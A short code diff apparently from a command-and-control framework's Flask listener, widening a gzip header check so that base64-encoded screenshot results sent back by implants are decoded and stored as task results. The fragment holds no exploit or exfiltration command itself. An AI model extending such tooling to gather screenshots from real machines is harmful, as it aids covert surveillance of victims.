@@ -285,7 +285,7 @@ def flaskListener(xor_key):
                 data = base64.b64decode(res["result"]).decode("utf-8")
 
                 # Handle Base64-encoded, gzipped PNG file (screenshot)
-                if data.startswith("H4sIAAAA"):
+                if data.startswith("H4sIAAAA") or data.startswith("H4sICAAAA"):
                     data = processScreenshot(np, data)
 
                 np.setTaskResult(res["guid"], data)
